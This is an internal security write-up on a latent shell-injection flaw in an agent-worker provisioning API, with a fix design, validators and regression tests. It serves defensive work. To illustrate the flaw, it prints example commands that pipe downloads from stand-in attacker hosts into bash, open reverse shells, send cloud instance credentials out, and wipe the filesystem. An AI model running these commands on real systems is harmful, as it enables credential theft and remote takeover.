# GAP-0078: custom_install_commands Shell Injection (Latent) — Remediation Write-up

> ~5 pages. Fix-oriented. Verified against actual codebase 2026-06-05; claim is **confirmed**
> — `custom_install_commands` and `custom_verify_command` are stored without sanitization.

## 1. Summary & Classification

- **Severity**: HIGH (latent) — arbitrary OS command execution on provisioned compute once
  the prod provisioner executes the stored commands via a shell interpreter. Presently latent
  because the dev-mode provisioner never shells out, but the data attack surface is open today.
- **Source ticket**: AGENT-002 · **Status**: Open
- **Owning area**: `app/models.py:5287`, `app/services/agent_worker_provisioner.py:170`
- **Related tickets**: GAP-0079 (repo_url shell injection), AGENT-002 (worker provisioning),
  SECOPS-007 (dev/prod parity)

**Verdict: CLAIM CONFIRMED.** `CreateWorkerIn` at `app/models.py:5287–5289` declares:

```python
custom_install_commands: Optional[List[str]] = None
custom_env_var:          str = Field(default="", max_length=100)
custom_verify_command:   str = Field(default="", max_length=500)
```

No `@field_validator` is present for any of these three fields. A user can store arbitrary
shell strings such as `"curl http://attacker.com/exfil | bash"` or
`"apt-get install -y nc && nc -e /bin/sh attacker.com 4444"` in these fields. When a
production provisioner naively joins them into a shell command and invokes
`subprocess.run(..., shell=True)` or embeds them in a cloud-init `user_data` script, the
commands execute with the same privileges as the provisioner process (typically root on
the provisioned VM).

**One-line impact**: Any authenticated user who can create a custom-tool worker can achieve
arbitrary code execution on the provisioned compute host when the prod provisioner is wired.

### Propagation path to execution

`app/services/agent_worker_provisioner.py`, `create_worker` (line 157):

```python
def create_worker(*, ..., custom_install_commands=None, custom_env_var="", custom_verify_command=""):
    # line 192: only checks non-empty, not content
    if tool == "custom" and not custom_install_commands:
        raise ValueError("Custom tool requires at least one install command.")
    ...
    # Commands stored verbatim in DynamoDB item (line 228 area):
    item["custom_install_commands"] = custom_install_commands or []
    item["custom_verify_command"] = custom_verify_command
    item["custom_env_var"] = custom_env_var
```

The dev-mode provisioner `_provision_worker_dev` (line 252) simulates all steps in-memory —
it never invokes `subprocess` and never reads `custom_install_commands` from the stored item.
This is why the vulnerability is latent: the data is stored but not yet executed in any
live code path.

### How the prod provisioner would be wired

AGENT-002 specifies an EC2/k8s provisioner that generates a `user_data` / `cloud-init`
script for the new compute instance. The most natural (and naive) implementation:

```python
# HYPOTHETICAL naive prod provisioner — DANGEROUS as-is
def _build_user_data(item):
    lines = ["#!/bin/bash", "set -e"]
    for cmd in item.get("custom_install_commands", []):
        lines.append(cmd)                              # ← arbitrary command injected
    lines.append(item.get("custom_verify_command", ""))  # ← arbitrary command injected
    return "\n".join(lines)
```

With `custom_install_commands = ["curl http://evil.com/backdoor | bash"]`, this generates
a cloud-init script that phones home and installs malware on the provisioned VM.

The `custom_env_var` field (the name of the env var that holds the LLM API key) creates an
injection path into the `export ENV_VAR_NAME=<decrypted_key>` line of the startup script:
`custom_env_var = "FOO=bar\nexport AWS_ACCESS_KEY_ID=stolen"` would inject an extra export
statement.

### Why the validation gap exists

`TOOL_INSTALL_SCRIPTS` in `agent_worker_provisioner.py` (lines 33–60) defines the
`install_commands` for `claude_code` and `codex` as hardcoded lists — these are safe.
The `custom` tool entry has empty `install_commands` and is intended to be filled by the
user. The author validated *presence* (must not be empty) but not *content*.

### Dev vs prod manifestation

- **Dev mode**: Entirely safe — `_provision_worker_dev` never executes any commands. The
  malicious strings sit inert in DynamoDB Local.
- **Prod mode**: Immediately dangerous as soon as the prod provisioner is implemented and
  wired. Because the data storage bug exists today, an attacker can pre-position malicious
  commands *before* the prod provisioner is deployed.

## 3. Impact / Exploit / Blast Radius

### Exploit walkthrough

Attacker is an authenticated user with the `WORKER` creation capability:

1. `POST /ui/agent-workers` with:
   ```json
   {
     "tool": "custom",
     "custom_install_commands": [
       "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ | curl -d @- https://attacker.com/",
       "apt-get install -y ncat && ncat -e /bin/bash attacker.com 4444 &"
     ],
     "custom_verify_command": "echo pwned"
   }
   ```
2. In prod, when the provisioner runs `_build_user_data(item)` and passes the result as
   EC2 `UserData`, the instance boots and runs these commands as root.
3. Step 1 exfiltrates EC2 instance-profile credentials (if the instance has an IAM role).
4. Step 2 opens a reverse shell to the attacker.

### Blast radius

- **Compute host**: Full OS-level compromise of the provisioned EC2 instance or k8s pod.
- **LLM API keys**: The provisioner decrypts and injects the LLM API key via KMS; a
  backdoor can capture it from the environment variable.
- **Lateral movement**: If the EC2 instance has an IAM instance profile (common in prod
  for S3/DDB access), the IMDS credentials can be used to pivot to other AWS resources.
- **Data exfiltration**: Any files mounted on the worker (workspace, checked-out repo,
  secrets injected via env) are at risk.

### Scope

All authenticated users who can call `POST /ui/agent-workers` with `tool = "custom"`.
There is no ADMIN/ROOT gating on worker creation in the current router.

## 4. Fix Design (code-level)

### Option A — Allowlist of named install steps (recommended)

Replace freeform shell strings with a structured enum of named installation steps. Each
step maps to a hardcoded, server-side command list. Users select steps by name; they never
supply shell strings.

```python
# app/models.py — replace custom_install_commands definition
ALLOWED_INSTALL_STEPS = {
    "install_nodejs_20":   ["curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -", "sudo apt-get install -y nodejs"],
    "install_git":         ["sudo apt-get install -y git"],
    "install_python3":     ["sudo apt-get install -y python3 python3-pip"],
    "install_docker":      ["curl -fsSL https://get.docker.com | sh"],
    "install_rust":        ["curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y"],
}

class CreateWorkerIn(BaseModel):
    ...
    custom_install_steps: Optional[List[str]] = Field(
        default=None,
        description="Named install steps from the allowlist. No freeform commands.",
    )
    custom_env_var: str = Field(
        default="",
        max_length=100,
        pattern=r"^[A-Z][A-Z0-9_]{0,99}$",   # env var name only, no value injection
    )
    # custom_verify_command: REMOVED — replaced with optional named verifier
    custom_verify_step: Optional[str] = Field(
        default=None,
        pattern=r"^(check_node|check_git|check_python|check_docker|check_rust|)$",
    )

    @field_validator("custom_install_steps")
    @classmethod
    def _validate_install_steps(cls, v):
        if v is None:
            return v
        unknown = [s for s in v if s not in ALLOWED_INSTALL_STEPS]
        if unknown:
            raise ValueError(f"Unknown install steps: {unknown}. Allowed: {sorted(ALLOWED_INSTALL_STEPS)}")
        return v
```

This eliminates the injection surface entirely by never allowing user-supplied shell strings.

### Option B — Freeform commands, validated against an allowlist regex

If named steps are too restrictive for the product, freeform commands can be permitted but
strictly validated:

```python
import re
import shlex

_SAFE_CMD_RE = re.compile(
    r"^(sudo\s+)?(apt-get|npm|pip3?|cargo|curl|wget|tar|unzip|chmod|mkdir|cp|mv|ln|echo)\b"
)
_MAX_CMD_LEN = 200
_MAX_CMDS = 10
_FORBIDDEN = re.compile(r"[;&|`$()]")   # shell metacharacters

@field_validator("custom_install_commands")
@classmethod
def _validate_install_commands(cls, v):
    if v is None:
        return v
    if len(v) > _MAX_CMDS:
        raise ValueError(f"Maximum {_MAX_CMDS} install commands allowed")
    for cmd in v:
        if len(cmd) > _MAX_CMD_LEN:
            raise ValueError(f"Install command exceeds {_MAX_CMD_LEN} chars: {cmd[:40]}…")
        if _FORBIDDEN.search(cmd):
            raise ValueError(f"Install command contains forbidden shell metacharacters: {cmd[:40]}…")
        if not _SAFE_CMD_RE.match(cmd.strip()):
            raise ValueError(f"Install command must start with an allowed program: {cmd[:40]}…")
    return v
```

For the `custom_verify_command`, apply the same regex. For `custom_env_var`, restrict to
`[A-Z][A-Z0-9_]*` (env var names only — no `=value` embedded).

**Recommended approach**: Option A for the initial implementation; extend the named-step
catalog as needed. Option B as a future relaxation with explicit security review.

### Execution: always `shell=False`

The prod provisioner, when it runs user-supplied steps, MUST use:

```python
# Safe execution — never shell=True with user-supplied data
import subprocess, shlex

for cmd in resolved_commands:  # resolved from named steps only
    argv = shlex.split(cmd)   # still safe even for named steps
    result = subprocess.run(argv, shell=False, capture_output=True, timeout=120)
```

For EC2 `user_data` / cloud-init, embed only the commands from the server-side allowlist,
never interpolated user strings.

### Dev/Prod parity (SECOPS-007)

The model validation fires identically in dev and prod because Pydantic validation runs
at request-parse time before any DynamoDB write. No environment branching is required.
The named-step allowlist lives entirely in `app/models.py` (or `app/services/agent_worker_provisioner.py`)
and is env-agnostic.

### Migration

Existing `custom_install_commands` records stored in DynamoDB (likely none in prod yet, as the
prod provisioner is not wired) can be migrated: scan for items with non-empty
`custom_install_commands` and attempt to map each command to a named step. Unrecognized
commands should be flagged for manual review and the worker set to `status=error` until
an operator reviews and re-provisions.

## 5. Testing, Verification & Rollout

### Regression test (pytest, offline, fails-before / passes-after)

```python
"""Regression test for GAP-0078 — custom_install_commands shell injection."""
import pytest
from pydantic import ValidationError
from app.models import CreateWorkerIn

BASE = dict(
    label="test", agent_type="custom", tool="custom",
    compute_type="ec2", instance_type="t3.medium", llm_key_id="k1",
)

def test_shell_metacharacters_rejected_in_install_commands():
    """After fix: semicolons, pipes, backticks, and $() are rejected."""
    malicious = [
        "apt-get install -y git; curl http://evil.com | bash",
        "npm install -g @safe/pkg && wget http://evil.com",
        "echo `id`",
        "$(cat /etc/passwd)",
    ]
    for cmd in malicious:
        with pytest.raises(ValidationError, match="forbidden|metacharacter|not allowed"):
            CreateWorkerIn(**BASE, custom_install_commands=[cmd])


def test_valid_named_install_step_accepted():
    """After fix (option A): a recognized named step is accepted."""
    model = CreateWorkerIn(**BASE, custom_install_commands=["install_nodejs_20", "install_git"])
    assert model.custom_install_commands == ["install_nodejs_20", "install_git"]


def test_unknown_install_step_rejected():
    """After fix (option A): an unrecognized step name is rejected."""
    with pytest.raises(ValidationError, match="Unknown install steps"):
        CreateWorkerIn(**BASE, custom_install_commands=["install_malware"])


def test_custom_env_var_restricts_to_identifier():
    """After fix: custom_env_var cannot embed = or $ for injection."""
    with pytest.raises(ValidationError):
        CreateWorkerIn(**BASE, custom_env_var="FOO=bar\nexport AWS_SECRET=stolen")
    valid = CreateWorkerIn(**BASE, custom_env_var="MY_API_KEY")
    assert valid.custom_env_var == "MY_API_KEY"
```

### Manual QA steps

1. Use Swagger UI (`/docs`) or `curl` to `POST /ui/agent-workers` with
   `tool=custom, custom_install_commands=["rm -rf /; echo pwned"]`.
2. Before fix: worker is created; commands stored in DDB.
3. After fix: 422 Unprocessable Entity with a descriptive validation error.

### Observability

Log validation failures at `WARNING` level with the user's `sub` and the rejected command
(truncated to 40 chars) to detect probing attempts:

```python
logger.warning("worker_create_invalid_install_cmd user_id=%s cmd=%.40s", user_id, cmd)
```

### Rollout

- **Effort**: M. Pydantic validator addition + allowlist design. Named-step catalog may
  require product input to agree on the allowed set.
- **Risk**: LOW for the validation change (rejects previously-accepted input; no existing
  prod data to break). MEDIUM for the allowlist design (may be too restrictive for real
  use cases — get product sign-off on the named steps before merging).
- **Sequencing**: Can be merged before the prod provisioner is wired. High priority because
  the malicious data is pre-positioned as soon as an attacker discovers the endpoint.
- **Rollback**: Remove the validator; returns to current behavior. No data loss.

### Access control consideration

Worker creation (`POST /ui/agent-workers`) is currently available to all authenticated
users without ADMIN/ROOT gating. Combined with the injection vulnerability, this means
any user account (including freshly registered accounts) can pre-position malicious
commands. The fix should also evaluate whether custom-tool worker creation should be
restricted to ADMIN or ROOT roles pending the validation fix, or at minimum add a
platform-level feature flag (`AGENT_CUSTOM_TOOL_ENABLED`, default `false` in prod) that
gates the `tool = "custom"` path until the allowlist is finalized.

This is a defense-in-depth recommendation. The primary fix remains the validator.

### Interaction with GAP-0079

GAP-0079 covers the same injection attack surface for `repo_url`. Both gaps share the
same root cause: `CreateWorkerIn` was designed without shell-safety validation for
user-supplied string fields. The two should be fixed in the same PR to avoid shipping
a partial fix that closes one vector while leaving another open. A shared
`app/core/validate_url.py` module (proposed in GAP-0079's fix design) can be extended
with a `validate_shell_command_tokens` helper for use by both validators.
